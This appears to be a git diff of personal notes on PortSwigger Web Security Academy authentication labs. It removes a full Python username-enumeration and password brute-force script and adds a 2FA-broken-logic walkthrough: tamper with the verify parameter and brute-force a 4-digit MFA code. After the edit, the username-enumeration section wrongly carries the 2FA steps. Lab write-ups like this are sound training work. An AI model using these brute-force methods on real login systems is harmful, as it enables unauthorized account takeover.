@@ -113,171 +113,28 @@ This lab is vulnerable to username enumeration and password brute-force attacks.
 
 **Screenshots:**
 
-![01-wordlist](images/lab-0.1-username-enumeration-different-responses/01-wordlist.png)
+![]()
 
-![02-lab-page](images/lab-0.1-username-enumeration-different-responses/02-lab-page.png)
-
-![03-invalid-user](images/lab-0.1-username-enumeration-different-responses/03-invalid-user.png)
-
-![04-tool](images/lab-0.1-username-enumeration-different-responses/04-tool.png)
-
-![05-solved](images/lab-0.1-username-enumeration-different-responses/05-solved.png)
-
-
-To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
+![]()
 
 ##### Tutorial
 
-1. Try get parameter username & password
-2. Prepare wordlists
-3. Start bruteforce with python scripts
+1. Login with your own account (`wiener:peter`) and reach the 2FA page
+2. Notice `POST /login2` uses the `verify` parameter to decide whose account is accessed
+3. Change `verify=carlos` — server generates a fresh 4-digit code for Carlos
+4. Brute-force `mfa-code` from `0000`–`9999` with `verify=carlos`
+5. A `302` response means the code is correct → open it in the browser
+6. Click **My account** → `Your username is: carlos` → lab solved
 
-```python
-#!/usr/bin/env python3
-"""
-Two-phase login brute-forcer for PortSwigger Authentication labs.
-Detects by RESPONSE LENGTH + status + optional regex (default: length).
+**Tool:** `tools/2fa-broken-logic.py`
 
-Phase 1: try each username with one fixed password; valid username = response
-         length differs from the invalid-user baseline (or matches --valid-regex).
-Phase 2: brute force the password of the valid username; success = length/status
-         differs from failed baseline (or matches --success-regex).
-
-Usage:
-  python3 "Username-enumeration-via-different-responses.py" --url https://<id>.web-security-academy.net/login \
-    --usernames usernames.txt --passwords passwords.txt --cookie "session=..."
-"""
-from __future__ import annotations
-import argparse, re, sys, time
-from pathlib import Path
-import requests
-
-def load(path):
-    out, seen = [], set()
-    for line in Path(path).read_text(encoding='utf-8', errors='replace').splitlines():
-        s = line.strip()
-        if s and s not in seen:
-            seen.add(s); out.append(s)
-    return out
-
-def norm(t):
-    return re.sub(r'\s+', ' ', t or '').lower()
-
-def main():
-    ap = argparse.ArgumentParser()
-    ap.add_argument('--url', required=True)
-    ap.add_argument('--usernames', required=True)
-    ap.add_argument('--passwords', required=True)
-    ap.add_argument('--cookie', default='')
-    ap.add_argument('--user-agent', default='Mozilla/5.0 (bruteforce-tool)')
-    ap.add_argument('--user-field', default='username')
-    ap.add_argument('--pass-field', default='password')
-    ap.add_argument('--phase', choices=['usernames','passwords','both'], default='both')
-    ap.add_argument('--fixed-password', default='test')
-    ap.add_argument('--username', default='')
-    ap.add_argument('--fail-regex', default='', help='regex marking FAILURE')
-    ap.add_argument('--valid-regex', default='', help='phase1: regex marking VALID username')
-    ap.add_argument('--success-regex', default='', help='phase2: regex marking SUCCESS')
-    ap.add_argument('--delay', type=float, default=0.0)
-    ap.add_argument('--timeout', type=float, default=15.0)
-    ap.add_argument('--all', action='store_true')
-    ap.add_argument('--proxy', default='')
-    args = ap.parse_args()
-
-    users = load(args.usernames)
-    pwds = load(args.passwords)
-    s = requests.Session()
-    s.headers.update({'User-Agent': args.user_agent})
-    if args.cookie: s.headers['Cookie'] = args.cookie
-    proxies = {'http':args.proxy,'https':args.proxy} if args.proxy else None
-    fail_re = re.compile(args.fail_regex, re.I) if args.fail_regex else None
-    valid_re = re.compile(args.valid_regex, re.I) if args.valid_regex else None
-    succ_re = re.compile(args.success_regex, re.I) if args.success_regex else None
-
-    def post(u,p):
-        return s.post(args.url, data={args.user_field:u, args.pass_field:p},
-                      timeout=args.timeout, allow_redirects=False, proxies=proxies)
-
-    # baseline for phase 1: one known-invalid username
-    baseline_len = None
-    try:
-        r0 = post('__invalid_user__', args.fixed_password)
-        baseline_len = len(r0.text or '')
-        print(f'[*] baseline invalid-user len={baseline_len} status={r0.status_code}', file=sys.stderr)
-    except Exception as e:
-        print(f'[!] baseline error: {e}', file=sys.stderr)
-
-    # phase 1
-    valid_users = []
-    if args.phase in ('usernames','both') and not args.username:
-        print(f'[*] PHASE 1: {len(users)} usernames (fixed pw="{args.fixed_password}")', file=sys.stderr)
-        for i,u in enumerate(users,1):
-            try: r = post(u, args.fixed_password)
-            except Exception as e: time.sleep(1); continue
-            body = r.text or ''
-            if valid_re:
-                ok = bool(valid_re.search(norm(body)))
-            else:
-                ok = (baseline_len is not None and len(body) != baseline_len) or r.status_code != r0.status_code
-            if ok:
-                print(f'[+] VALID USERNAME: {u} len={len(body)} status={r.status_code}', file=sys.stderr)
-                valid_users.append(u)
-                if not args.all: break
-            elif i % 25 == 0:
-                print(f'[*] {i}/{len(users)}', file=sys.stderr)
-            if args.delay: time.sleep(args.delay)
-
-    if args.phase == 'usernames':
-        print('VALID: ' + (', '.join(valid_users) if valid_users else 'none'))
-        return 0 if valid_users else 1
-
-    targets = [args.username] if args.username else valid_users
-    if not targets:
-        print('[-] no valid username; skip phase 2', file=sys.stderr)
-        return 1
-
-    # baseline for phase 2: valid user + wrong password
-    pwd_baseline = None
-    try:
-        rp = post(targets[0], '__wrong_pwd__')
-        pwd_baseline = (len(rp.text or ''), rp.status_code)
-        print(f'[*] phase2 baseline wrong-pw len={pwd_baseline[0]} status={pwd_baseline[1]}', file=sys.stderr)
-    except Exception: pass
-
-    print(f'[*] PHASE 2: {len(pwds)} passwords for {targets}', file=sys.stderr)
-    hits = []
-    for u in targets:
-        for i,p in enumerate(pwds,1):
-            try: r = post(u,p)
-            except Exception: time.sleep(1); continue
-            body = r.text or ''
-            if succ_re:
-                ok = bool(succ_re.search(norm(body)))
-            elif fail_re:
-                ok = not fail_re.search(norm(body))
-            else:
-                ok = (pwd_baseline is None or
-                      (len(body), r.status_code) != pwd_baseline)
-            if ok:
-                loc = r.headers.get('Location','')
-                print(f'[+] HIT {u}:{p} len={len(body)} status={r.status_code} {loc}', file=sys.stderr)
-                hits.append((u,p,r.status_code,loc))
-                if not args.all:
-                    print(f'\nFOUND {u}:{p}')
-                    return 0
-            elif i % 25 == 0:
-                print(f'[*] {u}: {i}/{len(pwds)}', file=sys.stderr)
-            if args.delay: time.sleep(args.delay)
-    print('HITS: ' + (', '.join(f'{u}:{p}' for u,p,_,_ in hits) if hits else 'none'))
-    return 0 if hits else 1
-
-if __name__ == '__main__':
-    sys.exit(main())
+```bash
+python3 "2fa-broken-logic.py" \
+  --url "https://<id>.web-security-academy.net/login2" \
+  --cookie "session=...; verify=carlos" \
+  --self-user wiener --self-pass peter \
+  --victim carlos
 ```
-
-4. Try see difference and filter length response
-5. If success get information try login username and password
-6. Success login
 
 ##### Reference
 
@@ -1584,7 +1441,80 @@ This is extremely dangerous if the attacker is then able to brute-force the veri
 
 ##### Lab: 2FA broken logic
 
+This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
 
+<details>
+<summary>Lab details, screenshots & walkthrough 0.7</summary>
+
+**Screenshots:**
+
+![01-login-wiener](images/lab-0.7-2fa-broken-logic/01-login-wiener.png)
+
+![02-email-client](images/lab-0.7-2fa-broken-logic/02-email-client.png)
+
+![03-account-wiener](images/lab-0.7-2fa-broken-logic/03-account-wiener.png)
+
+![04-login-carlos](images/lab-0.7-2fa-broken-logic/04-login-carlos.png)
+
+![05-verify-param](images/lab-0.7-2fa-broken-logic/05-verify-param.png)
+
+![06-burp-window](images/lab-0.7-2fa-broken-logic/06-burp-window.png)
+
+![07-terminal](images/lab-0.7-2fa-broken-logic/07-terminal.png)
+
+![08-response-url](images/lab-0.7-2fa-broken-logic/08-response-url.png)
+
+![09-solved](images/lab-0.7-2fa-broken-logic/09-solved.png)
+
+
+To solve the lab, access Carlos's account page.
+
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
+##### Tutorial
+
+1. Log in with your own account (`wiener:peter`) → the server redirects to `/login2` and emails a 4-digit code; this confirms the 2FA flow works
+2. Log out, then send `GET /login2?verify=carlos` — the server generates a fresh 4-digit code for **carlos** (the victim)
+3. Go to `/login` and log in as `carlos` with any password + a wrong 2FA code, then capture `POST /login2`
+4. Note that `POST /login2` trusts the `verify` parameter to decide whose code to check — set `verify=carlos`
+5. Brute-force `mfa-code` from `0000`–`9999` (only 4 digits, and the code is not tied to your session)
+6. A `302` response means the code is correct → open that response in the browser
+7. Click **My account** → `Your username is: carlos` → the lab registers `is-solved` and shows `Congratulations, you solved the lab`
+
+**Key point:** `verify` is client-controlled, so an attacker can request a code for any account and brute-force the 4-digit MFA code without ever owning that account.
+
+**Tool:** `tools/2fa-broken-logic.py`
+
+```bash
+python3 "2fa-broken-logic.py" \
+  --url "https://<id>.web-security-academy.net/login2" \
+  --cookie "session=...; verify=carlos" \
+  --self-user wiener --self-pass peter \
+  --victim carlos
+```
+
+##### Reference
+
+<details>
+<summary>10. Authentication Vulnerabilities - Lab #8 2FA broken logic | Short Version — Rana Khalil</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=dpcrsQ2nhBo
+Purpose: In this video, we cover Lab #8 in the Authentication module of the Web Security Academy. This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, we access Carlos's account page.
+
+</details>
+
+<details>
+<summary>11. 2FA broken logic | Short Version — Michael Sommer</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=Qf4Z2lcJeis
+Purpose: This video shows the lab solution of "2FA broken logic" from Web Security Academy (Portswigger)
+
+</details>
+
+</details>
 
 ### Brute-forcing 2FA verification codes
 
